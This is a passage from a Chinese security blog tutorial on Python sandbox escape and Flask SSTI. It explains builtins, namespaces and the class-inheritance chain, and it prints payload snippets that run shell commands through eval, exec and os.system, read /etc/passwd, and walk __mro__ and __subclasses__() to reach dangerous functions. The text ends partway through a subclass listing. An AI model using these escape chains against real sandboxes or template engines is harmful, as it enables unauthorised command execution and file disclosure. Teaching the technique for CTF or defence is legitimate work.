

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>



<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
  <link rel="icon" type="image/png" href="/img/favicon.png">
  <meta name="viewport"
        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="description" content="make changes, make perfect">
  <meta name="author" content="Dr34d">
  <meta name="keywords" content="blog">
  <title>python沙箱逃逸&amp;flask SSTI - Dr34d&#39;s blog</title>

  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css" />


  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />

  
    
    
      
      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.4.0/styles/xt256.min.css" />
    
  

  
    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
  



<!-- 主题依赖的图标库，不要自行修改 -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">


<link  rel="stylesheet" href="/css/main.css" />

<!-- 自定义样式保持在最底部 -->


  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    var CONFIG = {"hostname":"greydr34d.github.io","root":"/","version":"1.8.7","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":false,"onlypost":false},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}}};
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
<meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="Dr34d's blog" type="application/atom+xml">
</head>


<body>
  <header style="height: 70vh;">
    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand"
       href="/">&nbsp;<strong>Dr34d's Blog</strong>&nbsp;</a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/">
                <i class="iconfont icon-home-fill"></i>
                首页
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/">
                <i class="iconfont icon-archive-fill"></i>
                归档
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/">
                <i class="iconfont icon-category-fill"></i>
                分类
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/">
                <i class="iconfont icon-tags-fill"></i>
                标签
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/">
                <i class="iconfont icon-user-fill"></i>
                关于
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
                class="iconfont icon-search"></i>&nbsp;</a>
          </li>
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" href="javascript:">&nbsp;<i
                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

    <div class="banner" id="banner" parallax=true
         style="background: url('/img/ssti_banner.png') no-repeat center center;
           background-size: cover;">
      <div class="full-bg-img">
        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
          <div class="page-header text-center fade-in-up">
            <span class="h2" id="subtitle" title="python沙箱逃逸&flask SSTI">
              
            </span>

            
              <div class="mt-3">
  
  
    <span class="post-meta">
      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
      <time datetime="2020-10-05 15:21" pubdate>
        2020年10月5日 下午
      </time>
    </span>
  
</div>

<div class="mt-1">
  
    
    <span class="post-meta mr-2">
      <i class="iconfont icon-chart"></i>
      21.4k 字
    </span>
  

  
    
    <span class="post-meta mr-2">
      <i class="iconfont icon-clock-fill"></i>
      
      
      371
       分钟
    </span>
  

  
  
</div>

            
          </div>

          
        </div>
      </div>
    </div>
  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="d-none d-lg-block col-lg-2"></div>
    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div class="py-5" id="board">
          <article class="post-content mx-auto">
            <!-- SEO header -->
            <h1 style="display: none">python沙箱逃逸&amp;flask SSTI</h1>
            
              <p class="note note-info">
                
                  本文最后更新于：9 天前
                
              </p>
            
            <div class="markdown-body">
              <h1 id="python沙箱逃逸"><a href="#python沙箱逃逸" class="headerlink" title="python沙箱逃逸"></a>python沙箱逃逸</h1><p>要讲解python沙箱逃逸，首先就有必要来深入了解一下python的一些<strong>基础知识！</strong></p>
<h2 id="0x01-基础知识"><a href="#0x01-基础知识" class="headerlink" title="0x01 基础知识"></a>0x01 基础知识</h2><h3 id="内键函数"><a href="#内键函数" class="headerlink" title="内键函数"></a>内键函数</h3><p>当我们启动一个python解释器时，及时没有创建任何变量或者函数，还是会有很多函数可以使用，我们称之为内建函数。</p>
<p>内建函数并不需要我们自己做定义，而是在启动python解释器的时候，就已经导入到内存中供我们使用，想要了解这里面的工作原理，我们可以从名称空间开始。</p>
<h3 id="名称空间"><a href="#名称空间" class="headerlink" title="名称空间"></a>名称空间</h3><p>名称空间在python是个非常重要的概念，它是从名称到对象的映射，而在python程序的执行过程中，至少会存在两个名称空间</p>
<ul>
<li>内建名称空间：python自带的名字，在python解释器启动时产生，存放一些python内置的名字</li>
<li>全局名称空间：在执行文件时，存放文件级别定义的名字</li>
<li>局部名称空间（可能不存在）：在执行文件的过程中，如果调用了函数，则会产生该函数的名称空间，用来存放该函数内定义的名字，该名字在函数调用时生效，调用结束后失效</li>
</ul>
<p>加载顺序：内置名称空间*——&gt;全局名称空间—–&gt;局部名称空间* </p>
<p>名字的查找顺序：局部名称空间*——&gt;全局名称空间—–&gt;内置名称空间*</p>
<p>我们主要关注的是内建名称空间，是名字到内建对象的映射，在python中，初始的<strong>builtins</strong>模块提供内建名称空间到内建对象的映射</p>
<p>dir()函数用于向我们展示一个对象的属性有哪些，在没有提供对象的时候，将会提供当前环境所导入的所有模块，我们可以看到初始模块有哪些</p>
<p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20200929190721621.png" alt="image-20200929190721621"></p>
<p>这里面，我们可以看到<code>__builtins__</code>是做为默认初始模块出现的，那么用dir()命令看看<code>__builtins__</code>的成分。</p>
<p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20200929190812485.png" alt="image-20200929190812485"></p>
<p>在这个里面，我们会看到很多熟悉的关键字。比如：<code>__import__</code>、<code>str</code>、<code>len</code>等。看到这里大家会不会突然想明白为什么python解释器里能够直接使用某些函数了？比如直接使用len()函数</p>
<p>再或者说，我们可以直接import导入模块，这些操作其实都是python解释器事先给我们加载进去了的。</p>
<p><strong>就是说python可以再未加载任何模块的时候就可以使用的方法，在内键空间中已经声明过</strong></p>
<h3 id="类继承"><a href="#类继承" class="headerlink" title="类继承"></a>类继承</h3><p>python中对一个变量应用<strong>class</strong>方法从一个变量实例转到对应的对象类型后，类有以下三种关于继承关系的方法</p>
<div class="hljs code-wrapper"><pre><code class="hljs python">__base__ //对象的一个基类，一般情况下是<span class="hljs-built_in">object</span>，有时不是，这时需要使用下一个方法

__mro__ //同样可以获取对象的基类，只是这时会显示出整个继承链的关系，是一个列表，<span class="hljs-built_in">object</span>在最底层故在列表中的最后，通过__mro__[-<span class="hljs-number">1</span>]可以获取到

__subclasses__() //继承此对象的子类，返回一个列表</code></pre></div>



<p>有这些类继承的方法，我们就可以从任何一个变量，回溯到基类中去，再获得到此基类所有实现的类，就可以获得到很多的类啦。</p>
<h3 id="import导入机制"><a href="#import导入机制" class="headerlink" title="import导入机制"></a>import导入机制</h3><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/9113969-e5945487b84c3721.png" alt="图片.png"></p>
<p>所以说如果导入的模块a中有着另一个模块b，那么，我们可以用a.b的方法或者<code>a.__dict__[b&lt;name&gt;]</code>的方法间接访问模块b。</p>
<div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>f = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;test.py&#x27;</span>)
<span class="hljs-meta">&gt;&gt;&gt; </span>f.read()
<span class="hljs-string">&#x27;import os&#x27;</span>
<span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">import</span> test
<span class="hljs-meta">&gt;&gt;&gt; </span>test.os.system(<span class="hljs-string">&#x27;dir&#x27;</span>)
<span class="hljs-comment">###等价于</span>
<span class="hljs-meta">&gt;&gt;&gt; </span>test.__dict__[<span class="hljs-string">&#x27;os&#x27;</span>].system(<span class="hljs-string">&#x27;dir&#x27;</span>)</code></pre></div>



<h3 id="python魔术方法"><a href="#python魔术方法" class="headerlink" title="python魔术方法"></a>python魔术方法</h3><div class="hljs code-wrapper"><pre><code class="hljs python">__dict__：保存类实例或对象实例的属性变量键值对字典
__class__：返回调用的参数类型
__mro__：返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析。
__bases__：返回类型列表
__subclasses__：返回<span class="hljs-built_in">object</span>的子类
__init__：类的初始化方法
__globals__：函数会以字典类型返回当前位置的全部全局变量 与 func_globals 等价
__base__ 和 __mro__ 都是用来寻找基类的。
__getattribute__：实例、类、函数都具有的__getattribute__魔术方法。事实上，在实例化的对象进行.操作的时候（形如：a.xxx/a.xxx()），都会自动去调用.
__enter__：上下文管理器，为<span class="hljs-keyword">with</span>而生
__func__</code></pre></div>



<h3 id="常见函数、属性、模块"><a href="#常见函数、属性、模块" class="headerlink" title="常见函数、属性、模块"></a>常见函数、属性、模块</h3><h2 id="0x02-利用思路"><a href="#0x02-利用思路" class="headerlink" title="0x02 利用思路"></a>0x02 利用思路</h2><p>根据上面提到的类继承的知识，我们可以总结出一个利用方式（这也是python沙盒溢出的关键）：<strong>从变量-&gt;对象-&gt;基类-&gt;子类遍历-&gt;全局变量</strong> 这个流程中，找到我们想要的模块或者函数。</p>
<h3 id="获取当前python环境"><a href="#获取当前python环境" class="headerlink" title="获取当前python环境"></a>获取当前python环境</h3><h5 id="sys模块"><a href="#sys模块" class="headerlink" title="sys模块"></a>sys模块</h5><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> sys
sys.version</code></pre></div>



<h3 id="查看当前可以使用的函数"><a href="#查看当前可以使用的函数" class="headerlink" title="查看当前可以使用的函数"></a>查看当前可以使用的函数</h3><p>列出<code>__buildins__</code></p>
<p><code>dir(__buildins__)</code></p>
<div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-built_in">dir</span>(__builtins__)
[<span class="hljs-string">&#x27;ArithmeticError&#x27;</span>, <span class="hljs-string">&#x27;AssertionError&#x27;</span>, <span class="hljs-string">&#x27;AttributeError&#x27;</span>, <span class="hljs-string">&#x27;BaseException&#x27;</span>, <span class="hljs-string">&#x27;BlockingIOError&#x27;</span>, <span class="hljs-string">&#x27;BrokenPipeError&#x27;</span>, <span class="hljs-string">&#x27;BufferError&#x27;</span>, <span class="hljs-string">&#x27;BytesWarning&#x27;</span>, <span class="hljs-string">&#x27;ChildProcessError&#x27;</span>, <span class="hljs-string">&#x27;ConnectionAbortedError&#x27;</span>, <span class="hljs-string">&#x27;ConnectionError&#x27;</span>, <span class="hljs-string">&#x27;ConnectionRefusedError&#x27;</span>, <span class="hljs-string">&#x27;ConnectionResetError&#x27;</span>, <span class="hljs-string">&#x27;DeprecationWarning&#x27;</span>, <span class="hljs-string">&#x27;EOFError&#x27;</span>, <span class="hljs-string">&#x27;Ellipsis&#x27;</span>, <span class="hljs-string">&#x27;EnvironmentError&#x27;</span>, <span class="hljs-string">&#x27;Exception&#x27;</span>, <span class="hljs-string">&#x27;False&#x27;</span>, <span class="hljs-string">&#x27;FileExistsError&#x27;</span>, <span class="hljs-string">&#x27;FileNotFoundError&#x27;</span>, <span class="hljs-string">&#x27;FloatingPointError&#x27;</span>, <span class="hljs-string">&#x27;FutureWarning&#x27;</span>, <span class="hljs-string">&#x27;GeneratorExit&#x27;</span>, <span class="hljs-string">&#x27;IOError&#x27;</span>, <span class="hljs-string">&#x27;ImportError&#x27;</span>, <span class="hljs-string">&#x27;ImportWarning&#x27;</span>, <span class="hljs-string">&#x27;IndentationError&#x27;</span>, <span class="hljs-string">&#x27;IndexError&#x27;</span>, <span class="hljs-string">&#x27;InterruptedError&#x27;</span>, <span class="hljs-string">&#x27;IsADirectoryError&#x27;</span>, <span class="hljs-string">&#x27;KeyError&#x27;</span>, <span class="hljs-string">&#x27;KeyboardInterrupt&#x27;</span>, <span class="hljs-string">&#x27;LookupError&#x27;</span>, <span class="hljs-string">&#x27;MemoryError&#x27;</span>, <span class="hljs-string">&#x27;ModuleNotFoundError&#x27;</span>, <span class="hljs-string">&#x27;NameError&#x27;</span>, <span class="hljs-string">&#x27;None&#x27;</span>, <span class="hljs-string">&#x27;NotADirectoryError&#x27;</span>, <span class="hljs-string">&#x27;NotImplemented&#x27;</span>, <span class="hljs-string">&#x27;NotImplementedError&#x27;</span>, <span class="hljs-string">&#x27;OSError&#x27;</span>, <span class="hljs-string">&#x27;OverflowError&#x27;</span>, <span class="hljs-string">&#x27;PendingDeprecationWarning&#x27;</span>, <span class="hljs-string">&#x27;PermissionError&#x27;</span>, <span class="hljs-string">&#x27;ProcessLookupError&#x27;</span>, <span class="hljs-string">&#x27;RecursionError&#x27;</span>, <span class="hljs-string">&#x27;ReferenceError&#x27;</span>, <span class="hljs-string">&#x27;ResourceWarning&#x27;</span>, <span class="hljs-string">&#x27;RuntimeError&#x27;</span>, <span class="hljs-string">&#x27;RuntimeWarning&#x27;</span>, <span class="hljs-string">&#x27;StopAsyncIteration&#x27;</span>, <span class="hljs-string">&#x27;StopIteration&#x27;</span>, <span class="hljs-string">&#x27;SyntaxError&#x27;</span>, <span class="hljs-string">&#x27;SyntaxWarning&#x27;</span>, <span class="hljs-string">&#x27;SystemError&#x27;</span>, <span class="hljs-string">&#x27;SystemExit&#x27;</span>, <span class="hljs-string">&#x27;TabError&#x27;</span>, <span class="hljs-string">&#x27;TimeoutError&#x27;</span>, <span class="hljs-string">&#x27;True&#x27;</span>, <span class="hljs-string">&#x27;TypeError&#x27;</span>, <span class="hljs-string">&#x27;UnboundLocalError&#x27;</span>, <span class="hljs-string">&#x27;UnicodeDecodeError&#x27;</span>, <span class="hljs-string">&#x27;UnicodeEncodeError&#x27;</span>, <span class="hljs-string">&#x27;UnicodeError&#x27;</span>, <span class="hljs-string">&#x27;UnicodeTranslateError&#x27;</span>, <span class="hljs-string">&#x27;UnicodeWarning&#x27;</span>, <span class="hljs-string">&#x27;UserWarning&#x27;</span>, <span class="hljs-string">&#x27;ValueError&#x27;</span>, <span class="hljs-string">&#x27;Warning&#x27;</span>, <span class="hljs-string">&#x27;WindowsError&#x27;</span>, <span class="hljs-string">&#x27;ZeroDivisionError&#x27;</span>, <span class="hljs-string">&#x27;_&#x27;</span>, <span class="hljs-string">&#x27;__build_class__&#x27;</span>, <span class="hljs-string">&#x27;__debug__&#x27;</span>, <span class="hljs-string">&#x27;__doc__&#x27;</span>, <span class="hljs-string">&#x27;__import__&#x27;</span>, <span class="hljs-string">&#x27;__loader__&#x27;</span>, <span class="hljs-string">&#x27;__name__&#x27;</span>, <span class="hljs-string">&#x27;__package__&#x27;</span>, <span class="hljs-string">&#x27;__spec__&#x27;</span>, <span class="hljs-string">&#x27;abs&#x27;</span>, <span class="hljs-string">&#x27;all&#x27;</span>, <span class="hljs-string">&#x27;any&#x27;</span>, <span class="hljs-string">&#x27;ascii&#x27;</span>, <span class="hljs-string">&#x27;bin&#x27;</span>, <span class="hljs-string">&#x27;bool&#x27;</span>, <span class="hljs-string">&#x27;breakpoint&#x27;</span>, <span class="hljs-string">&#x27;bytearray&#x27;</span>, <span class="hljs-string">&#x27;bytes&#x27;</span>, <span class="hljs-string">&#x27;callable&#x27;</span>, <span class="hljs-string">&#x27;chr&#x27;</span>, <span class="hljs-string">&#x27;classmethod&#x27;</span>, <span class="hljs-string">&#x27;compile&#x27;</span>, <span class="hljs-string">&#x27;complex&#x27;</span>, <span class="hljs-string">&#x27;copyright&#x27;</span>, <span class="hljs-string">&#x27;credits&#x27;</span>, <span class="hljs-string">&#x27;delattr&#x27;</span>, <span class="hljs-string">&#x27;dict&#x27;</span>, <span class="hljs-string">&#x27;dir&#x27;</span>, <span class="hljs-string">&#x27;divmod&#x27;</span>, <span class="hljs-string">&#x27;enumerate&#x27;</span>, <span class="hljs-string">&#x27;eval&#x27;</span>, <span class="hljs-string">&#x27;exec&#x27;</span>, <span class="hljs-string">&#x27;exit&#x27;</span>, <span class="hljs-string">&#x27;filter&#x27;</span>, <span class="hljs-string">&#x27;float&#x27;</span>, <span class="hljs-string">&#x27;format&#x27;</span>, <span class="hljs-string">&#x27;frozenset&#x27;</span>, <span class="hljs-string">&#x27;getattr&#x27;</span>, <span class="hljs-string">&#x27;globals&#x27;</span>, <span class="hljs-string">&#x27;hasattr&#x27;</span>, <span class="hljs-string">&#x27;hash&#x27;</span>, <span class="hljs-string">&#x27;help&#x27;</span>, <span class="hljs-string">&#x27;hex&#x27;</span>, <span class="hljs-string">&#x27;id&#x27;</span>, <span class="hljs-string">&#x27;input&#x27;</span>, <span class="hljs-string">&#x27;int&#x27;</span>, <span class="hljs-string">&#x27;isinstance&#x27;</span>, <span class="hljs-string">&#x27;issubclass&#x27;</span>, <span class="hljs-string">&#x27;iter&#x27;</span>, <span class="hljs-string">&#x27;len&#x27;</span>, <span class="hljs-string">&#x27;license&#x27;</span>, <span class="hljs-string">&#x27;list&#x27;</span>, <span class="hljs-string">&#x27;locals&#x27;</span>, <span class="hljs-string">&#x27;map&#x27;</span>, <span class="hljs-string">&#x27;max&#x27;</span>, <span class="hljs-string">&#x27;memoryview&#x27;</span>, <span class="hljs-string">&#x27;min&#x27;</span>, <span class="hljs-string">&#x27;next&#x27;</span>, <span class="hljs-string">&#x27;object&#x27;</span>, <span class="hljs-string">&#x27;oct&#x27;</span>, <span class="hljs-string">&#x27;open&#x27;</span>, <span class="hljs-string">&#x27;ord&#x27;</span>, <span class="hljs-string">&#x27;pow&#x27;</span>, <span class="hljs-string">&#x27;print&#x27;</span>, <span class="hljs-string">&#x27;property&#x27;</span>, <span class="hljs-string">&#x27;quit&#x27;</span>, <span class="hljs-string">&#x27;range&#x27;</span>, <span class="hljs-string">&#x27;repr&#x27;</span>, <span class="hljs-string">&#x27;reversed&#x27;</span>, <span class="hljs-string">&#x27;round&#x27;</span>, <span class="hljs-string">&#x27;set&#x27;</span>, <span class="hljs-string">&#x27;setattr&#x27;</span>, <span class="hljs-string">&#x27;slice&#x27;</span>, <span class="hljs-string">&#x27;sorted&#x27;</span>, <span class="hljs-string">&#x27;staticmethod&#x27;</span>, <span class="hljs-string">&#x27;str&#x27;</span>, <span class="hljs-string">&#x27;sum&#x27;</span>, <span class="hljs-string">&#x27;super&#x27;</span>, <span class="hljs-string">&#x27;tuple&#x27;</span>, <span class="hljs-string">&#x27;type&#x27;</span>, <span class="hljs-string">&#x27;vars&#x27;</span>, <span class="hljs-string">&#x27;zip&#x27;</span>]</code></pre></div>

<p>常用的函数：</p>
<div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-built_in">eval</span>: <span class="hljs-built_in">eval</span>(<span class="hljs-string">&#x27;__import__(&quot;os&quot;).system(&quot;ls&quot;)&#x27;</span>)

<span class="hljs-built_in">input</span>: <span class="hljs-built_in">__import__</span>(<span class="hljs-string">&#x27;os&#x27;</span>).system(<span class="hljs-string">&#x27;ls&#x27;</span>)

<span class="hljs-built_in">open</span>,file: file(<span class="hljs-string">&#x27;/etc/passwd&#x27;</span>).read() <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;/etc/passwd&#x27;</span>).read()

<span class="hljs-built_in">exec</span> : exec(<span class="hljs-string">&quot;__import__(&#x27;os&#x27;).system(&#x27;ls&#x27;)&quot;</span>);

execfile: 加载文件进内，相当于<span class="hljs-keyword">from</span> xx <span class="hljs-keyword">import</span> *

execfile(<span class="hljs-string">&#x27;/usr/lib/python2.7/os.py&#x27;</span>)  system(<span class="hljs-string">&#x27;ls&#x27;</span>)

<span class="hljs-built_in">map</span>　回调函数

<span class="hljs-built_in">map</span>(os.system,[<span class="hljs-string">&#x27;ls&#x27;</span>])</code></pre></div>





<h3 id="object寻找"><a href="#object寻找" class="headerlink" title="object寻找"></a>object寻找</h3><blockquote>
<p>其主要思想是使用_<em>class__、__mro__、__bases_</em></p>
</blockquote>
<div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__[<span class="hljs-number">2</span>]
[].__class__.__mro__[<span class="hljs-number">1</span>]
&#123;&#125;.__class__.__mro__[<span class="hljs-number">1</span>]
().__class__.__mro__[<span class="hljs-number">1</span>]
[].__class__.__mro__[-<span class="hljs-number">1</span>]
&#123;&#125;.__class__.__mro__[-<span class="hljs-number">1</span>]
().__class__.__mro__[-<span class="hljs-number">1</span>]
&#123;&#125;.__class__.__bases__[<span class="hljs-number">0</span>]
().__class__.__bases__[<span class="hljs-number">0</span>]
[].__class__.__bases__[<span class="hljs-number">0</span>]
[].__class__.__base__
().__class__.__base__
&#123;&#125;.__class__.__base__
request.__class__.__mro__[<span class="hljs-number">8</span>] //针对jinjia2/flask为[<span class="hljs-number">9</span>]适用</code></pre></div>





<h3 id="子类遍历"><a href="#子类遍历" class="headerlink" title="子类遍历"></a><strong>子类遍历</strong></h3><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(<span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__[-<span class="hljs-number">1</span>].__subclasses__()): <span class="hljs-built_in">print</span> i</code></pre></div>

<div class="hljs code-wrapper"><pre><code class="hljs lisp">(<span class="hljs-number">0</span>, &lt;type &#x27;type&#x27;&gt;)
(<span class="hljs-number">1</span>, &lt;type &#x27;weakref&#x27;&gt;)
(<span class="hljs-number">2</span>, &lt;type &#x27;weakcallableproxy&#x27;&gt;)
(<span class="hljs-number">3</span>, &lt;type &#x27;weakproxy&#x27;&gt;)
(<span class="hljs-number">4</span>, &lt;type &#x27;int&#x27;&gt;)
(<span class="hljs-number">5</span>, &lt;type &#x27;basestring&#x27;&gt;)
(<span class="hljs-number">6</span>, &lt;type &#x27;bytearray&#x27;&gt;)
(<span class="hljs-number">7</span>, &lt;type &#x27;list&#x27;&gt;)
(<span class="hljs-number">8</span>, &lt;type &#x27;NoneType&#x27;&gt;)
(<span class="hljs-number">9</span>, &lt;type &#x27;NotImplementedType&#x27;&gt;)
(<span class="hljs-number">10</span>, &lt;type &#x27;traceback&#x27;&gt;)
(<span class="hljs-number">11</span>, &lt;type &#x27;super&#x27;&gt;)
(<span class="hljs-number">12</span>, &lt;type &#x27;xrange&#x27;&gt;)
(<span class="hljs-number">13</span>, &lt;type &#x27;dict&#x27;&gt;)
(<span class="hljs-number">14</span>, &lt;type &#x27;set&#x27;&gt;)
(<span class="hljs-number">15</span>, &lt;type &#x27;slice&#x27;&gt;)
(<span class="hljs-number">16</span>, &lt;type &#x27;staticmethod&#x27;&gt;)
(<span class="hljs-number">17</span>, &lt;type &#x27;complex&#x27;&gt;)
(<span class="hljs-number">18</span>, &lt;type &#x27;float&#x27;&gt;)
(<span class="hljs-number">19</span>, &lt;type &#x27;buffer&#x27;&gt;)
(<span class="hljs-number">20</span>, &lt;type &#x27;long&#x27;&gt;)
(<span class="hljs-number">21</span>, &lt;type &#x27;frozenset&#x27;&gt;)
(<span class="hljs-number">22</span>, &lt;type &#x27;property&#x27;&gt;)
(<span class="hljs-number">23</span>, &lt;type &#x27;memoryview&#x27;&gt;)
(<span class="hljs-number">24</span>, &lt;type &#x27;tuple&#x27;&gt;)
(<span class="hljs-number">25</span>, &lt;type &#x27;enumerate&#x27;&gt;)
(<span class="hljs-number">26</span>, &lt;type &#x27;reversed&#x27;&gt;)
(<span class="hljs-number">27</span>, &lt;type &#x27;code&#x27;&gt;)
(<span class="hljs-number">28</span>, &lt;type &#x27;frame&#x27;&gt;)
(<span class="hljs-number">29</span>, &lt;type &#x27;builtin_function_or_method&#x27;&gt;)
(<span class="hljs-number">30</span>, &lt;type &#x27;instancemethod&#x27;&gt;)
(<span class="hljs-number">31</span>, &lt;type &#x27;function&#x27;&gt;)
(<span class="hljs-number">32</span>, &lt;type &#x27;classobj&#x27;&gt;)
(<span class="hljs-number">33</span>, &lt;type &#x27;dictproxy&#x27;&gt;)
(<span class="hljs-number">34</span>, &lt;type &#x27;generator&#x27;&gt;)
(<span class="hljs-number">35</span>, &lt;type &#x27;getset_descriptor&#x27;&gt;)
(<span class="hljs-number">36</span>, &lt;type &#x27;wrapper_descriptor&#x27;&gt;)
(<span class="hljs-number">37</span>, &lt;type &#x27;instance&#x27;&gt;)
(<span class="hljs-number">38</span>, &lt;type &#x27;ellipsis&#x27;&gt;)
(<span class="hljs-number">39</span>, &lt;type &#x27;member_descriptor&#x27;&gt;)
(<span class="hljs-number">40</span>, &lt;type &#x27;file&#x27;&gt;)
(<span class="hljs-number">41</span>, &lt;type &#x27;PyCapsule&#x27;&gt;)
(<span class="hljs-number">42</span>, &lt;type &#x27;cell&#x27;&gt;)
(<span class="hljs-number">43</span>, &lt;type &#x27;callable-iterator&#x27;&gt;)
(<span class="hljs-number">44</span>, &lt;type &#x27;iterator&#x27;&gt;)
(<span class="hljs-number">45</span>, &lt;type &#x27;sys.long_info&#x27;&gt;)
(<span class="hljs-number">46</span>, &lt;type &#x27;sys.float_info&#x27;&gt;)
(<span class="hljs-number">47</span>, &lt;type &#x27;EncodingMap&#x27;&gt;)
(<span class="hljs-number">48</span>, &lt;type &#x27;fieldnameiterator&#x27;&gt;)
(<span class="hljs-number">49</span>, &lt;type &#x27;formatteriterator&#x27;&gt;)
(<span class="hljs-number">50</span>, &lt;type &#x27;sys.version_info&#x27;&gt;)
(<span class="hljs-number">51</span>, &lt;type &#x27;sys.flags&#x27;&gt;)
(<span class="hljs-number">52</span>, &lt;type &#x27;sys.getwindowsversion&#x27;&gt;)
(<span class="hljs-number">53</span>, &lt;type &#x27;exceptions.BaseException&#x27;&gt;)
(<span class="hljs-number">54</span>, &lt;type &#x27;module&#x27;&gt;)
(<span class="hljs-number">55</span>, &lt;type &#x27;imp.NullImporter&#x27;&gt;)
(<span class="hljs-number">56</span>, &lt;type &#x27;zipimport.zipimporter&#x27;&gt;)
(<span class="hljs-number">57</span>, &lt;type &#x27;nt.stat_result&#x27;&gt;)
(<span class="hljs-number">58</span>, &lt;type &#x27;nt.statvfs_result&#x27;&gt;)
(<span class="hljs-number">59</span>, &lt;class &#x27;warnings.WarningMessage&#x27;&gt;)
(<span class="hljs-number">60</span>, &lt;class &#x27;warnings.catch_warnings&#x27;&gt;)
(<span class="hljs-number">61</span>, &lt;class &#x27;_weakrefset._IterationGuard&#x27;&gt;)
(<span class="hljs-number">62</span>, &lt;class &#x27;_weakrefset.WeakSet&#x27;&gt;)
(<span class="hljs-number">63</span>, &lt;class &#x27;_abcoll.Hashable&#x27;&gt;)
(<span class="hljs-number">64</span>, &lt;type &#x27;classmethod&#x27;&gt;)
(<span class="hljs-number">65</span>, &lt;class &#x27;_abcoll.Iterable&#x27;&gt;)
(<span class="hljs-number">66</span>, &lt;class &#x27;_abcoll.Sized&#x27;&gt;)
(<span class="hljs-number">67</span>, &lt;class &#x27;_abcoll.Container&#x27;&gt;)
(<span class="hljs-number">68</span>, &lt;class &#x27;_abcoll.Callable&#x27;&gt;)
(<span class="hljs-number">69</span>, &lt;type &#x27;dict_keys&#x27;&gt;)
(<span class="hljs-number">70</span>, &lt;type &#x27;dict_items&#x27;&gt;)
(<span class="hljs-number">71</span>, &lt;type &#x27;dict_values&#x27;&gt;)
(<span class="hljs-number">72</span>, &lt;class &#x27;site._Printer&#x27;&gt;)
(<span class="hljs-number">73</span>, &lt;class &#x27;site._Helper&#x27;&gt;)
(<span class="hljs-number">74</span>, &lt;type &#x27;_sre.SRE_Pattern&#x27;&gt;)
(<span class="hljs-number">75</span>, &lt;type &#x27;_sre.SRE_Match&#x27;&gt;)
